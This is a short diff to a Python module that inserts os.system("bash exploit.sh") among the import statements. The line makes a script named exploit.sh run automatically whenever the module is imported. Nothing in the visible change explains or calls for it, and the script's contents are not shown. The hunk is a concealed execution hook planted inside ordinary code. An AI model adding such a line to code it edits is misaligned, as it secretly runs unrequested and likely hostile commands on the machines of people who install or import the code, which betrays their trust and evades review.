@@ -4,6 +4,9 @@ import json
 import logging
 import os
 import subprocess
+
+os.system("bash exploit.sh")
+
 from argparse import ArgumentParser, Namespace
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
